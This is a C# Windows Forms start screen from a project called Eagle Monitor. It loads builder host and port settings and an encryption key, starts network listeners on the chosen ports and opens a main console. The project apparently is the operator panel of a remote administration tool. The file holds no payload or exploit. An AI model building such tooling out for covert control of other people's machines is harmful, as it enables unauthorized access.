using Eagle_Monitor.Controls;
using Eagle_Monitor.Helpers;
using Microsoft.VisualBasic;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor
{
    public partial class StartForm : FormPattern
    {
        public static Main M = new Main();

        public StartForm()
        {
            InitializeComponent();
        }

        private void StartForm_Load(object sender, EventArgs e)
        {
            //Utilities.DarkTheme = true;
            Utilities.AnimateWindow(this.Handle, 500, Utilities.dwFlags.AW_BLEND);

            

            if (File.Exists(Utilities.GPath + "\\builder.json"))
            {
                string json = System.IO.File.ReadAllText(Utilities.GPath + "\\builder.json");
                BuilderHelper.builderSetting = JsonConvert.DeserializeObject<BuilderHelper.BuilderSetting>(json);
            }
            else 
            {
                BuilderHelper.builderSetting = new BuilderHelper.BuilderSetting();
                BuilderHelper.builderSetting.hostBuilder = new List<string>();
                BuilderHelper.builderSetting.hostPortBuilder = new List<int>();
            }

            if (File.Exists(Utilities.GPath + "\\config.json"))
            {
                string json = System.IO.File.ReadAllText(Utilities.GPath + "\\config.json");
                Utilities.settings = JsonConvert.DeserializeObject<Settings>(json);
                keyTextBox.Text = Utilities.settings.Key;
                Utilities.RSMKey = Utilities.settings.Key;

                foreach (int p in Utilities.settings.Ports)
                {
                    listView1.Items.Add(p.ToString());
                }
            }
            else 
            {
                Utilities.settings = new Settings();
            }

            if (Utilities.settings.encryptionFileManagerKey != null && Utilities.settings.encryptionFileManagerKeySize != null) 
            {
                Utilities.key = Utilities.settings.encryptionFileManagerKey;
                Utilities.settings.encryptionFileManagerKey = Utilities.settings.encryptionFileManagerKey;
                Utilities.settings.encryptionFileManagerKeySize = Utilities.settings.encryptionFileManagerKeySize;
                Utilities.settings.algorithm = Utilities.settings.algorithm;
            }
            try
            {
                string[] L = System.IO.File.ReadAllLines(Utilities.GPath + "\\Logs.ini");
                Color Theme;
                if (Utilities.DarkTheme)
                    Theme = Color.FromArgb(232, 232, 232);
                else
                    Theme = Color.FromArgb(64, 64, 64);

                foreach (string s in L)
                {
                    M.logsListView.Items.Add(s).ForeColor = Theme;
                }
            }
            catch (Exception)
            {
            }
        }

        private async void ListenButton_Click(object sender, EventArgs e)
        {
            ListenButton.Enabled = false;
            keyTextBox.Enabled = false;
            listView1.ContextMenuStrip = null;
            Utilities.RSMKey = keyTextBox.Text;           
            await Task.Run(() =>
            {             
                int percentage = 0;
                int count = 0;
                do
                {
                    string[] Files = Directory.GetFiles(Utilities.GPath + "\\Flags\\", "*.*", SearchOption.TopDirectoryOnly);

                    foreach (string h in Files)
                    {
                        try
                        {
                            using (Image U = Image.FromFile(h))
                            {
                                string S = Utilities.SplitPath(h).Replace(".png", "").ToUpper();
                                M.countryImageList.Images.Add(S, U);
                                percentage = (count + 1) * 100 / Files.Length;
                                windowsProgressBar1.Value = percentage;
                                count += 1;
                                Thread.Sleep(1);
                            }

                        }
                        catch (Exception)
                        {
                            count += 1;
                        }
                    }

                } while (percentage < 100);
                Shared.Utils.ClearMem();
            });
            this.Hide();
            Server.Launched = true;
            List<string> p = new List<string>();
            Utilities.settings.Ports = new List<int>();
            Utilities.settings.Key = keyTextBox.Text;
            foreach (ListViewItem I in listView1.Items)
            {
                Utilities.settings.Ports.Add(int.Parse(I.Text));
                Server S = new Server(int.Parse(I.Text));
            }

            M.keySizeComboBox.Text = Utilities.settings.encryptionFileManagerKeySize;
            M.keyTextBox.Text = Utilities.settings.encryptionFileManagerKey;
            M.algoComboBox.SelectedIndex = (int)Utilities.settings.algorithm;
            string savedSettings = JsonConvert.SerializeObject(Utilities.settings);
            File.WriteAllText(Utilities.GPath + "\\config.json", savedSettings);
            Utilities.Theme();
            M.ShowDialog();
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            Utilities.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string p = Interaction.InputBox("Port :");
            int pAdd;
            if(int.TryParse(p , out pAdd) == true) 
            {
                listView1.Items.Add(p).ForeColor = Color.FromArgb(64, 64, 64);
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                listView1.SelectedItems[0].Remove();
            }
        }
    }
}
